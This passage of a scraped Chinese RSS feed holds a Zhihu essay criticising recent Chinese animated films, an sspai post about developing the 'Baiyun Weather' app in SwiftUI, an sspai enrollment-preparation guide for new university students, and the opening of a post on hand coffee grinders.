data-private-watermark-src=\"v2-b7d3cfa4725ca8edee67cf74b6183855\"></p>\n<p>这个问题说得更加直接一点，这些把中国经典神话和名著故事修改成好莱坞式个人成长故事的剧本，讲的是“中国”故事吗？也许，到头来只是一部部由中国人制作的迪士尼《花木兰》而已。这些动画电影在国外有多少影响力呢？甚至于，他们做到在国内范围向国人讲述中国故事的任务了吗？</p>\n<p>以票房50.35亿元的《哪吒之魔童降世》为例，尽管这个例子已经有些老生常谈：一个关于哪吒闹海故事的当代解读，剧本的核心主旨却落在了“家庭价值”之上，很难不令人感到荒谬。如果创作者是想表达传统的家庭价值，中国传统文化宝库中的素材并不缺少，可他们偏偏选择传统文化中反抗父权制的代表哪吒来阐释“父慈子孝”，将原作中哪吒与父权的不共戴天改换成亲情至上，在成长中与父母和解的温情戏码，让本来不服从任何强权的哪吒归顺“天道”，这其中的思维逻辑是如何运转的？</p>\n<p>有观点认为，现代解读要贴合时代精神，当下家庭价值是一种能够传遍世界的普世价值，这一解读是为了让哪吒的故事走向世界，让更多现代观众和外国观众理解——那么敢问，这部在国内席卷50.35亿票房的动画电影，怎么海外票房累计只有600多万美元，仅占到全球总票房的0.5%呢？</p>\n<p>抛开国产电影海外宣发的不易，最终这个拥护家庭价值的、属于世界的哪吒，还是没有走向世界（倒是一路破坏到底的孙悟空更容易被世界理解一些）。说到底，还是不要给他们戴上“文化输出”的高帽，他们当初选择让哪吒拥护家庭价值的根本原因，只不过是他们认为好莱坞的商业剧本模式是好的，而按照这个剧本模式写作的话，必然需要一个温和的价值观基底，那么直接沿用美国动画电影的“家庭观”是最方便的罢了——票房成绩也证明了他们的远见。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fe1e00c3f67df2626f38dc1e00ed7312_720w.jpg?rss\" data-caption=\"家庭价值是《哪吒之魔童降世》的重要主题。图片：《哪吒之魔童降世》预告片截图\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-fe1e00c3f67df2626f38dc1e00ed7312\" data-watermark-src=\"v2-1e1490e71b9fc6b523d95e443a4f6c5f\" data-private-watermark-src=\"v2-054a76fa548602be0ffccbcbe376f799\"></p>\n<p>只不过，这一点都不“国潮”，还是一部迪士尼的《花木兰》，而且是2020年的真人版；当初迪士尼动画版《花木兰》，甚至在跨文化视野上做得还很多元——别人在北美讲跨文化的中国故事，我们在中国讲普世故事。</p>\n<p>相较看来，虽然追光动画的《新神榜：哪吒重生》里的哪吒是个没成长的、反对一切的愣头青，剧本完全没有找到成长主题与原作精神的契合点，哪怕影片破除题材和时代限制玩起了蒸汽朋克、赛博朋克和荒野机车，哪怕影片在美术视觉上无限地“反叛”与现代，这个哪吒本质上都比《哪吒之魔童降世》更中国——此时，去批判这几部动画电影的主角塑造其实还是立足于美式个人英雄主义都显得苛求了，毕竟同样是塑造英雄，中国故事与世界故事的差异在哪里还需要进一步探索，但无论如何，都比直接把哪吒“父慈子孝”更中国一些。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-113c09309f7686c2ef4e5052d954bbb9_720w.jpg?rss\" data-caption=\"《新神榜：哪吒重生》中的“民国蒸汽朋克”街景。图片：《新神榜：哪吒重生》官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"335\" data-watermark=\"original\" data-original-src=\"v2-113c09309f7686c2ef4e5052d954bbb9\" data-watermark-src=\"v2-d22670673f5df44004c6bb50f7053585\" data-private-watermark-src=\"v2-e02fcee82f89bec1ce548a3344d940b8\"></p>\n<p>必然会有反对的声音说，这些国产动画电影的票房数字可观，对它们的受众群体大小、剧本和制作水平以及意识形态内容的反思都不成立，毕竟人民群众用电影票说话了——从票房数字的美梦中醒来吧！《白蛇2：青蛇劫起》救市成功了吗？在《哪吒之魔童降世》成功后被寄予了过高票房期望的国产动画电影，这两年间有哪一部真正达到口碑和票房的预期了呢？</p>\n<p>六年来观众用爱发电，每次都以拯救中国动画产业的牺牲心态购票入场，面对这些六年来没有什么长进，还在选题和创意上越发枯竭和套路化的作品，用如此的宽容所塑造的票房美梦还能坚持多久呢？距离破灭的日子已经不远了，也许在我们看不到的暗影中，在各大动画制片方还在紧锣密鼓地推出各种片单计划的背后，无论是观众还是投资方，都在默默寻找下一个淘金新风口——“国潮”“古风”依然坚挺，谁都还要吃这碗饭，但谁也没有说一定要在国产动画电影这个被定了型的缝合怪上吊死：其他的选择必然是有的。</p>\n<p>写作这篇反思录时，我与一名在国产动画电影行业里摸爬滚打多年的老同学做了交流，我询问我的部分想法是不是过分激烈、偏颇了一些，结果她说，“你这么温和是转性了吗？我们内部开会时说得比这狠多了”。她的这句话，可能是我对国产动画电影还抱有最后期望的原因；至少这些显而易见的问题，业界并不是熟视无睹的，之所以长久以来没有被解决，当然不会全是创作者的责任。那么，就一起把这些问题告诉资本方吧：六年来国产动画电影的崛起与“盛世”之下，可能需要一些看向未来的危言。</p>\n<p>注：文中引用大陆电影市场票房数据来自“猫眼专业版”app；海外电影票房数据来自美国专业网站Box Office Mojo。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e460fa339f4bc667a9fba12d8fb7b7b3_720w.jpg?rss\" data-caption=\"在日本等海外市场取得一定成功的《罗小黑战记》。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"190\" data-watermark=\"original\" data-original-src=\"v2-e460fa339f4bc667a9fba12d8fb7b7b3\" data-watermark-src=\"v2-9b1d80b4a680ffd7babd9f705516093d\" data-private-watermark-src=\"v2-32a4280d73749de7387394d5066f861c\"></p>\n<p><br></p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.allnow.com/post/61231d0cfbcfb8144541fdaf%3Fplatform%3Dzh\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-9b776f0f147c66a018f49aa7dc1174e6_bh.jpg\" data-image-width=\"220\" data-image-height=\"100\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">高调崛起之后的暗影危机--国产动画电影六年反思录-全现在官方网站</a><p><br>关注<b><a href=\"https://www.zhihu.com/column/c_1374438877965520897\" class=\"internal\">次元研究专栏</a></b>，汇聚跨次元的浅趣深知。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ci-yuan-yan-jiu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">次元研究</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/21831384/answer/2081202766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">80 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21760112?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评论中国动画？</a><br><a href=\"http://www.zhihu.com/question/410430997?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么不能吹国产动画崛起？</a><br>\n","link":"http://www.zhihu.com/question/21831384/answer/2081202766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"[送码] 简约而不简单，我做了一个「彩云天气精简版」：白云天气","date":"2021-08-24 09:44:40","description":"\n<p>记得几年前，有次在户外进行拍摄相关的工作，厦门突如其来的大雨，直接把我困在公园里的大树下。遇到这样的情况时，我们通常会面临选择：是一直待在原地等雨停，还是淋着雨跑出去呢？我想答案要取决于这突如其来的大雨会持续多久。那时候，是彩云天气给了我答案，打开彩云天气 app，便能预知当前的大雨接下来会有什么样的变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/99fd2b00183a468661ebbcab93daf60c.JPG\"><figcaption>公交车窗外的雨，摄于上海</figcaption></figure><p>除了可以得到几分几时雨停的信息之外，彩云天气提供的小时天气信息我也特别喜欢，在苏州生活时，二楼露台上的花植经不起大风摧残，我会通过查看小时的风力预测信息来调整露台的抗风工作。</p>\n<p>每次和朋友聊到天气相关的话题时，由于精准实用的街道分钟级降雨预测，我总忍不住给他们推荐彩云天气。 </p>\n<p>2020 年 2 月 29 日，我发了这样一条微博：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/21/06b271fd577574337d111f24de1951dc.png\"></figure><p>微博发出之后，我在彩云科技开发平台注册了账号，申请了对应的接口权限，但由于种种原因，开发工作一直未开始。</p>\n<p>2021 年 7 月 8 日，时间过去了一年多，我本来在准备另一款 app 的大版本更新，但进程有些曲折，便偶然想起要不停下一会儿，试试彩云天气的数据接口玩一下。就这样，我开始了新的学习之旅。</p>\n<p>我将这款新的 app 取名为白云天气，原因很简单：我希望它能相对彩云天气简单一些。</p>\n<h2>设计：一目了然感知天气</h2>\n<p>为了让我的学习之旅看起来更有收获，我决定用 Figma 来完成设计工作。一直以来，我都听说 Figma 是一款非常优秀的设计工具，但从未上手过。借这次机会，我正好熟悉它。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/a46e11559b1cd655e6fc782da72e82cf.png\"><figcaption>白云天气设计稿</figcaption></figure><p>此前的 <a href=\"https://sspai.com/post/65951\" target=\"_blank\">奇妙组件</a> 是我第一次尝试用渐变色彩来做设计，白云天气延续了这样的色彩风格。针对不同的天气现象，我分别设计了对应不同的背景色彩。相比于大部分的天气软件，白云天气的背景色彩会显得更加轻盈写意一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/2674f4554e69c49416476a9e022cb648.JPEG\"><figcaption>日落前和刚入夜时的背景色彩</figcaption></figure><p>白云天气的背景色彩做了很详尽的细分。比如说，小雨、中雨、大雨、暴雨这四种气象虽然都是雨，但它们也有着不同的色彩；再比如，在每天傍晚至深夜这个时间段里，白云天气的背景色彩会按日落前、日落时、日落后、刚入夜、深夜进行细分变化，为了遵循现实生活里的经验，针对日出日落这样的细分变化仅会出现在多云和晴天的时候。</p>\n<p>在实际的 app 里，白云天气的色彩表现会比设计稿上来得更有趣一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/362369bc0e0d9fcdf2b9a3090377b059.GIF\"><figcaption>1 级风和 10 级以上大风时的背景变化速度</figcaption></figure><p>白云天气的背景色彩会通过我预先调好的几种渐变规则进行随机变化，同时，它们的变化速度会根据当前天气的风速而调整。大部分的时候，白云天气的背景色彩就像呼吸一样在流动，但如果你遇见了 10 级以上大风（陆地生活里几乎不会出现的），那么背景色彩的变换速度会达到极值，像是警告信号一样闪烁不止。</p>\n<h2>代码：用 SwiftUI 边学边写</h2>\n<p>除了设计工具采用了陌生的 Figma 以外，为了学习更彻底，白云天气也是我的第一款完全使用 SwiftUI 开发完成的 app。</p>\n<p>就个人粗浅的感受来说，除去那些偶然让人捉摸不透的 bug 来说，SwiftUI 对于用户界面的实现，的确要舒适畅快许多。白云天气里有不少的界面设计都是直接在撰写代码的过程中边写边设计调整而完成的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/91e50c4cc4f110882efa20a9cff7b8a5.JPEG\"><figcaption>两个直接在代码里完成设计的界面</figcaption></figure><p>同样得益于 SwiftUI，我可以较为轻松地实现一些动态效果。除了早先介绍的动态背景色彩外，白云天气的另一特点是预设了跟随实际雨雪雾等气象而进行变化的动画，这两者结合在一起，能帮助你轻松感知当前的天气状况。</p>\n<p>例如，在遇到下雨气象时，动态动画会呈现下雨的样式，并且雨水落下的速度、大小、数量以及角度会跟随着降雨量的情况以及当时的风速而调整。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/1109865625dd94417b741cb206dcc95c.GIF\"><figcaption>中雨和大雨时呈现的对应动画</figcaption></figure><p>和雨雪气象时动画跟随降雨降雪量及风速调整不同，雾霾、浮尘等天气时呈现的动画将会跟随当时空气质量的 PM 2.5 值而进行调整。这类天气的具体效果我就不截图展示了，希望大家都遇不上这类坏天气。</p>\n<h2>功能：一切都是熟悉的</h2>\n<p>进入首页，白云天气提供的所有信息都铺在这里，这类似于 iOS 系统天气的布局，想查看更多信息，只需轻轻滑动即可。在滑动查看小时天气数据时，我设计了一个会跟随滑动操作移动的小光标，光标指哪里，提示文字就会对应更新，以告诉你当前查看的天气信息具体是哪个时间什么样的，如果没有这样的提示，我们仅通过小时字样和图标可能难以识别出具体信息内容。</p>\n<p>在城市列表里，长按卡片会进入编辑模式，轻点卡片将删除收藏的天气卡片；在搜索界面里，搜索会在键入文字后自动进行，你不必再多点一次搜索按钮。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/42c2dfa03ad7b991f68dfe875682b6b9.JPEG\"></figure><p>在小时信息方面，我做了自定义的功能。除了开篇提到的小时风力信息外，用户还可以根据自己需要，选择显示云量、湿度、气压、能见度以及短波辐射这些小时天气数据。</p>\n<p>如你所见，在功能与交互方面，白云天气没什么特别的。它只是一个纯粹简单的天气 app，尽可能在保持轻盈的同时提供准确的天气数据，我希望它没有额外的学习成本，因为在这里最重要的是把天气看明白。</p>\n<h2>小组件：延续风格</h2>\n<p>当前版本的白云天气设计了三个尺寸的基础小组件，它们的功能几乎与彩云天气或系统天气的小组件无差，你可以通过长按 - 编辑小组件来设定显示不同的城市和特定天气数据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/21/06621e255a20f461f0653f560172e06f.JPEG\"></figure><p>和白云天气的主程序一样，小组件的背景颜色也会跟随气象的不同而进行调整。不过，受限于系统针对小组件的刷新机制，小组件很难做到完全及时更新，基于这个原因，我更推荐你将白云天气的小组件用于装饰和粗略参考的作用，如果想查看准确的天气信息时，还是打开主程序最靠谱。</p>\n<p>老实讲，在这个时间段去做一款全新的天气 app，多少有些不太理智。如我所讲，对于白云天气，我的出发点是想完成自己之前的一个小心愿，为了让这个过程更有意义一些，我强迫自己使用对我而言比较陌生的 Figma 和 SwiftUI 来完成整个产品的设计和开发工作，以达到在一个实际项目里进行学习的目的。</p>\n<p>如今，这个小项目完成了，比我预期的完成度更高一些，它足以满足我的简单需求。如果你和我一样对于天气预报的需求相对简单，那么白云天气可能也适合你。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/%E7%99%BD%E4%BA%91%E5%A4%A9%E6%B0%94-%E6%84%9F%E7%9F%A5%E8%87%AA%E7%84%B6%E5%91%BC%E5%90%B8/id1575901953\" target=\"_blank\">App Store</a> 免费下载白云天气，年订阅价格 28 元。受限于天气数据接口的权限以及付费成本，白云天气暂时无法提供彩云天气的所有功能，小组件和城市查询等功能需要通过订阅付费的形式来进行解锁。</p>\n<p>如果你有任何关于白云天气的好建议，欢迎与我联系。</p>\n<h2>送码</h2>\n<p>在评论区说说你对白云天气的建议，以及你对于天气 App 的需求和看法，下周一 (08.30) 选 2 位读者送出年订阅兑换码。 </p>\n<span class=\"ss-application\" app-id=\"16151\"> </span><p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68392"},{"title":"开学季 | 从通知书包裹到证件照片，做个「有备而来」的新同学","date":"2021-08-24 08:00:00","description":"\n<p>每年夏天都是一个告别和迎接新开始的季节。有很多朋友收到大学的录取通知书，即将开启一个新的旅程。但是有一些朋友还是不太了解通知书包裹里东西究竟有什么用，也有一些朋友在报道时没有处理好一些手续而遇到麻烦。我想和大家分享一下，录取通知书包裹里的东西都有什么用，收到录取通知书之后该做什么。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4flehlb34tb094k5csg.png\"></figure><h2>别忘记录取书包裹里的重要东西</h2>\n<h3>录取通知书</h3>\n<p>包裹里肯定会有的就是录取通知书，拿到包裹后<strong>一定要本人签收，当着快递员的面拆开包裹</strong>，先看有没有录取通知书。没有的话真的是很严重的事情，一定要第一时间联系招生办或者负责联络学生的老师。拿到录取通知书后首先<strong>检查自己的姓名、录取学院、专业</strong>是否正确，录取通知书的<strong>编号和条形码</strong>是否完整，通知书是否完好，有没有折损的情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4flehtb34tb0b5qhg40.png\"></figure><p>拿到录取通知书之后要<strong>复印扫描存档</strong>，防止出现意外。注意也不要折叠。还有一点很重要的是，虽然大家很激动，也想晒出自己即将升入的学校，但是拍照发朋友圈记得打码学号和条形码。因为学号会伴随你整个大学时期，也是重要的个人隐私信息，不论在什么时候，都不要轻易让别人知晓。</p>\n<p>另外，大学新生凭录取通知书原件和本人身份证到火车站售票窗口，或者通过电话和网络订票，就能购买到<strong>学生优惠票价</strong>。订票成功后，凭录取通知书、身份证和订单号到售票大厅窗口取票。</p>\n<h3>银行卡</h3>\n<p>通知书包裹里还会有一张银行卡。请注意，这张银行卡是由学校代你申领的。这张银行卡非常重要，请不要轻易丢弃。需要通过这张银行卡<strong>缴纳学费和领取奖学金、补助</strong>等。具体来说，学校会授权给银行，在某个日期之前统一从银行卡中划走学费，完成学费的缴纳。另外，如果你获得奖学金、助学金等，也都会通过这张银行卡发放。可以说，在校期间，你的学号和银行卡是绑定的，几乎所有交钱和发钱的事情，都通过这张银行卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4flehtb34tb0oe104cg.png\"></figure><p>拿到银行卡之后，需要拿上身份证先去周边的任一银行网点<strong>激活</strong>。在银行里修改个人信息，绑定手机号，开通网银等，这关系着后续银行卡的正常使用。但是银行的业务员同时也会推荐你办一些非必需的业务，比如开通电话银行和短信服务，但是这些不办一般也不会影响你的银行卡的使用。在激活银行卡之后，建议先存一点钱，帮家里交点水电费之类的看看是否可以正常使用，如果无法正常使用，一定要第一时间联系或前往附近的银行网点。</p>\n<p>另外，出于安全的考虑，不建议与常用购物平台绑定，也不建议绑定需要支付授权的软件。也有学校开通了在线支付平台，可以使用其他银行卡交学费，如果在自动扣学费之前在平台上缴纳了学费那么后续就不会再扣除相关费用。如果你真的觉得使用学校的银行卡麻烦，可以在校期间申请更换绑定的银行卡（不过一定要提前问清楚学校支持不支持换绑定的银行卡）。</p>\n<h3>电话卡</h3>\n<p>有些学校会在包裹里加上当地的电话卡，但是现在大部分的学校已经没有了。卡内默认的业务大多是综合考虑学生需求的业务，更偏向大流量等等，套餐价格大多也是对学生比较友好。如果想要使用，就需要学生自行激活电话卡、根据自己的需要修改绑定的业务。当然，如果不喜欢学校选择的通讯公司，可以自行选择别的公司的电话卡。</p>\n<h3>新生手册</h3>\n<p>还有就是新生手册，也有的学校把新生手册转为电子版。新生手册上会有一些关于教务、校园、生活等基本介绍。建议收到新生手册之后翻看一下<strong>目录</strong>，标记一些重点内容的页码，比如报到时间、报到地点、报到流程之类的内容。还有就是个人比较关心的内容，比如奖助金的规则等等。新生手册可能会伴随你的整个大学时期，很多不记得的规则（例如评奖学金、转专业等等）都可以通过查找新生手册找到相关内容。建议把新生手册一起带到学校去，需要的时候方便翻阅。有些学校在新生手册的最后还会附上一些重要的表格，比如不住宿申请、不参保申请等等，建议保存这些表格以备不时之需。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4flei5b34tb0oe104d0.png\"></figure><p> </p>\n<h3>纪念品</h3>\n<p>在录取通知书包裹里还会有学校送的纪念品，有些是校长的一封信，也有贺卡、书籍，也有的学校会定制精美的校园建筑模型。这个纪念品不作为报到时候的凭证，但是可以留作纪念，纪念自己曾经努力得到了回报。</p>\n<h2>其他需要准备的</h2>\n<p>除了包裹里面所包括的东西，也有一些包裹里没有的但是额外的事项在报到前特别注意。尤其是在疫情小范围反复的情况下，有一些非常规的事项需要在报到前安排妥当。</p>\n<h3>健康申报</h3>\n<p>在全国仍有疫情中高风险地区的情况下，很多高校要求学生在报到入校前 14 天做<strong>连续的健康申报</strong>。请各位按照学校以及学院的通知每天进行健康申报，有些学校是使用所在省市的健康申报平台，也有学校开发了自己的健康申报系统。同时，有少部分学校要求学生下载健康申报打卡表格，进行每天的体温记录。</p>\n<p>希望每位入学前的新生一定一定要<strong>按时申报，严肃对待</strong>。一旦中间间断或者错过申报时间，造成无法报到或者无法顺利前往学校所在地，那后续报到的手续和流程都会十分麻烦。大部分学校会定时推送消息提醒各位同学进行健康申报，也有少部分院校仅在开始健康申报的时候做通知。请需要进行健康申报的同学可以定一个闹钟，以免自己忘记当天的健康申报。</p>\n<h3>核酸检测</h3>\n<p>大部分同学都是需要前往外地上学，请在出发前一定查询好<strong>学校所在地的防疫要求</strong>以及<strong>核酸检测证明</strong>要求。有些地区要求到达时必须有48小时内的核酸证明，也有地区要求到达后必须第一时间前往就近的医院进行核酸检测。还有些地区要求从低风险地区出发的同学持绿码就可以。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4fleidb34tb0oe104dg.png\"></figure><p>如果需要出发前做核酸检测，请各位同学注意出核酸证明报告的时间，大部分是8小时出结果，大致是上午检测核酸，下午出报告。不要因为报告的时间出现问题而耽误出发和报到的行程。</p>\n<h3>档案寄送</h3>\n<p>人事档案是记录个人学习经历、工作经历的重要材料。档案材料是否完备，对今后的学习工作有重大影响。人事档案包括两部分：入学前的档案材料和在学校攻读学位期间所产生的学习经历材料。高考的朋友们的档案已经在院校报考和录取时由本科院校提走。</p>\n<p>读研的朋友在院校确定录取之后会寄给你一份调档函，需要凭借这份调档函进行档案的寄送。一般是交给本科的辅导员，由学校在毕业之后统一进行寄送。而需要注意的是，在寄送之后需要和录取的院校<strong>确认是否收到档案</strong>，不然会影响到后续的入学报到。</p>\n<p>为了保证个人人事档案的完整，避免因档案不全带来的各种不便和影响，也请各位同学在学期间认真按要求填写各类表格，并及时上交。档案材料须是打印或用黑色签字笔、钢笔书写，不得使用圆珠笔、铅笔、红色笔和复写纸书写，材料内容不得使用纸质粘贴。</p>\n<h3>户口迁移</h3>\n<p>首先，户口是否迁入学校并不是强制的。迁入学校的优点在于办理一些重要的手续和证明就不用本人跑回家，比如护照、签证、更换新的身份证。如果户口不想迁入学校，也不会造成特别大的影响。但是迁入学校的是集体户口，<strong>学生集体户口迁移属于限制迁移类型</strong>，也只能在入学时选择迁入与否，在校期间无法迁入户口。另外，迁入学校集体户的学生户口也无法随意迁出，只有在升学、就业或退学时凭相关证明方可办理户口迁出手续。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4fleilb34tb094k5ct0.png\"></figure><p>办理户口迁移的新生凭《录取通知书》在当地公安部门办理户口迁移手续，由当地派出所出具《户口迁移证》。各位同学在拿到《户口迁移证》后请对以下事项认真检查、核对以下信息：</p>\n<ol>\n<li>户口<strong>迁往地址</strong>要正确。迁往地址一定是学校给出的官方学校地址。</li>\n<li>户口迁移证上的<strong>姓名、身份证号码应与本人的身份证及录取通知书上的一致</strong>。</li>\n<li>右下角应盖<strong>当地派出所公章</strong>，公章必须清晰。</li>\n<li>迁移证上的内容一律<strong>不能涂改</strong>，如有涂改，公安部门不予办理落户手续（涂改过的户口迁移证必须回当地派出所重新办理）。</li>\n<li>\n<strong>出生地及籍贯栏</strong>必须具体到<strong>省市</strong>。</li>\n</ol>\n<p>如发现问题，请及时与当地派出所联系。</p>\n<h3>助学贷款</h3>\n<p>一定一定和大家强调的是，<strong>不要由于经济原因放弃读书的机会</strong>，有很多很多便利条件帮助你解决，千万不要学一些脑残电视剧里面，觉得家庭条件不好而放弃读书机会。</p>\n<p>家庭经济困难学生可在入学前办理<strong>生源地信用助学贷款</strong>，在校期间利息由国家承担，毕业后的利息由借款人全额支付，学生毕业后还款期内继续攻读学位的，可办理继续贴息。还款期限原则上按学制加15年确定，最长不超过22年。办理生源地信用助学贷款的学生可具体向户籍所在县（市区）的学生资助管理中心或金融机构进行咨询。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4fleitb34tb0oe104e0.png\"></figure><p>也可以在入学后办理<strong>校园地国家助学贷款</strong>。在校期间利息由国家承担，毕业后的利息由借款人全额支付，学生毕业后还款期内继续攻读学位的，可办理继续贴息。还款期限原则上按学制加15年确定，最长不超过22年。所需要的相关材料需要根据院校的具体要求准备。</p>\n<p>很多院校还有入学的<strong>绿色通道</strong>。已经办理了生源地信用助学贷款的学生可缓交贷款额度内的学费和住宿费；未办理生源地信用助学贷款的家庭经济特别困难的学生可缓交部分学费、住宿费。办理了绿色通道的学生可先办理入学手续。</p>\n<p>很多学校还有其他方面的补助，比如勤工俭学、学生医疗补助、学生紧急援助等。有需要的一定一定要提前了解清楚，具体问题也可以拨打院校的电话进行了解。另外，相关信息查询一定要认准 <a href=\"http://www.moe.gov.cn/\" target=\"_blank\">教育部官网</a> 以及院校的官方网站，警惕诈骗。</p>\n<h3>转组织关系</h3>\n<p>已经成为党员的同学在升学前注意开具转组织的相关资料。党员组织关系<strong>介绍信</strong>须由新生党员所在地县级以上党委的组织部门开出。到校后，携带党员组织关系介绍信到所在培养单位党组织办理组织关系接转。团员需要保存好自己的团员证，到校之后通过「智慧团建」系统进行相应的转接关系。</p>\n<h3>一寸、二寸照片</h3>\n<p>在开学之后可能需要填写很多表格，在出发之前，最好准备好本人若干一寸和二寸的免冠照片，以备不时之需。最好是白底、蓝底、红底都准备一些，不然需要填表贴照片的时候临时去找一个照相馆，拍出来的质量不敢保证，而照片可能会伴随你很长时间。</p>\n<p>你的录取通知书里都有什么有趣的东西？你还有哪些报到时需要注意的事情可以分享？欢迎在评论区与我们分享讨论。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68401"},{"title":"国物馆 | 你应该知道的国产手摇磨豆机","date":"2021-08-24 06:26:59","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p>咖啡作为舶来品，国内的发展肯定要比国外晚的多，因此包括咖啡豆和设备也都是国外的更好或更有知名度一些。但随着近几年中国咖啡市场的火热，现磨咖啡开始进入家庭，那么一台性价比高的磨豆机就成了很多喜欢现磨咖啡的用户首要的目标。</p>\n<p>目前除了国外的出名产品外，国内也有了很多品牌推出去自己的设备，这篇文章借着国货主题，跟大家聊聊手摇磨豆机选购注意事项，以及一些冷门好用的磨豆机推荐。</p>\n<p>PS：本次推荐的产品包括我用过的产品，但目前手里的产品不全，主要跟大家说说选购一款磨豆机应该从哪几方面考虑，目前主流的手摇磨豆机的设计结构。</p>\n<h2>认识手摇磨豆机</h2>\n<p>手摇磨豆机，算是很妙的一个设备，本身极具性价比。个人推测，手摇磨豆机的出现，前身是磨胡椒的工具（如果有知道具体历史的大佬欢迎科普）。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/19/4592504b26720a13e02993f44e17ea0c.png\"></figure><p>手摇磨豆机的好处是什么呢？</p>\n<ol>\n<li>结构简单，拆卸方便好维护</li>\n<li>体积小巧，好收纳</li>\n<li>便携性好，不用电，可随身携带</li>\n<li>性价比高，同等研磨效果，比电动磨豆机要便宜</li>\n</ol>\n<figure class=\"image ss-img-wrapper image_resized\"><img 